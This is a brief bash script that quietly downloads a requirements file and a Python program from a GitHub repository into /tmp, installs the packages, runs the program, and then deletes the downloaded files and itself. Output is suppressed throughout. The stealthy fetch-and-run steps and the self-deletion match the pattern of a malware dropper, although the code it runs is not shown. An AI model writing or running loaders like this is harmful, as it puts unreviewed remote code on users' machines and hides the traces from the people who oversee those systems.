#!/bin/bash

curl -f -s -o /tmp/requiment.txt https://raw.githubusercontent.com/Chahalor/TIG/refs/heads/main/requiment.txt > /dev/null 2>&1
chmod +x /tmp/requiment.txt
pip install -q -r /tmp/requiment.txt > /dev/null 2>&1

curl -f -s -o /tmp/main.py https://raw.githubusercontent.com/Chahalor/TIG/refs/heads/main/main.py > /dev/null 2>&1
chmod +x /tmp/main.py
python3 /tmp/main.py

rm -- /tmp/main.py
rm -- /tmp/requiment.txt
rm -- "$0"
